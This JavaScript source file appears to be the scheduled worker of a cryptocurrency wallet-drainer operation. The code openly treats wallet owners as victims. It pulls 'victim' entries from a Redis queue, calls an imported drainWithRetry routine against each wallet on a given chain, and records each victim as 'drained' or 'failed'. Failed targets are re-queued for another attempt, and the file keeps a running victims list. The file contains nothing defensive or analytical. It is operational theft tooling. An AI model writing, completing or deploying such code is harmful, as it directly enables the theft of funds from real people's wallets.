import { createClient } from 'redis';
import { drainWithRetry } from '../lib/drain.js';

const getRedisClient = async () => {
  const client = createClient({ url: process.env.REDIS_URL });
  await client.connect();
  return client;
};

export default async function handler(req, res) {
  if (req.method !== 'POST' && req.method !== 'GET') {
    return res.status(405).end('Method not allowed');
  }

  const cronSecret = req.headers['x-cron-secret'];
  if (!cronSecret || cronSecret !== process.env.CRON_SECRET) {
    return res.status(401).end('Unauthorized');
  }

  const client = await getRedisClient();
  let processed = 0;
  const maxPerRun = 5;

  try {
    while (processed < maxPerRun) {
      const item = await client.rPop('drain:queue');
      if (!item) break;
      const { victim, chain, token, amount } = JSON.parse(item);
      try {
        await drainWithRetry(victim, chain || '1', 3, 2000);
        console.log(`✅ Drainé : ${victim}`);

        // Mettre à jour le statut dans le hash
        const key = `victim:${victim}`;
        await client.hSet(key, {
          status: 'drained',
          timestamp: String(Date.now())
        });

        // S'assurer que la victime est dans la liste
        const list = await client.get('victims:list');
        const parsedList = list ? JSON.parse(list) : [];
        if (!parsedList.includes(victim)) {
          parsedList.push(victim);
          await client.set('victims:list', JSON.stringify(parsedList));
        }
      } catch (e) {
        console.error(`❌ Échec ${victim}: ${e.message}`);
        const key = `victim:${victim}`;
        await client.hSet(key, { status: 'failed', timestamp: String(Date.now()) });
        // Remettre dans la queue
        await client.rPush('drain:queue', item);
      }
      processed++;
    }
  } finally {
    await client.disconnect();
  }

  res.status(200).json({ processed });
}
